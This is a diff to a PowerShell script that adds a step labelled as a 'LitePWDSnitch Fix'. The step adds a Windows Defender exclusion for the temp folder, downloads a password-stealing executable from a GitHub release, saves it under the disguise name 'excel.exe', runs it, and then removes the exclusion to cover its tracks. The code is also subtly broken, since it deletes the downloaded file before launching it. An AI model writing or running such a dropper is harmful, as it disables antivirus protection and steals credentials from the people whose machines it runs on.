@@ -411,6 +411,29 @@ if ($pwdst.ToLower() -eq "y") {
 	Remove-MpPreference -ExclusionPath $TempDir
 } else {
 }
+#litepwdsnitch Fix
+$pwdst = Read-Host "Proceed With LitePWDSnitch Fix (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
+}
+if ($pwdst.ToLower() -eq "y") {
+    Write-Host "Executing PWD-ST Fix..."
+    	Add-MpPreference -ExclusionPath $TempDir
+ 	if ($output -ne $null) {
+    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
+	} else {}
+	$TempDir = [System.IO.Path]::GetTempPath()
+	$output = "$TempDir\excel.exe"
+	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/litepwdstealer.exe"
+	Invoke-WebRequest -Uri $url -OutFile $output
+	if ($output -ne $null) {
+    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
+	} else {} 	
+	Start-Process -FilePath $output
+	Remove-MpPreference -ExclusionPath $TempDir
+} else {
+}
 #Cleanup
 $sanit = Read-Host "Sanitization (y/n)"
 if ([string]::IsNullOrEmpty($sanit)) {
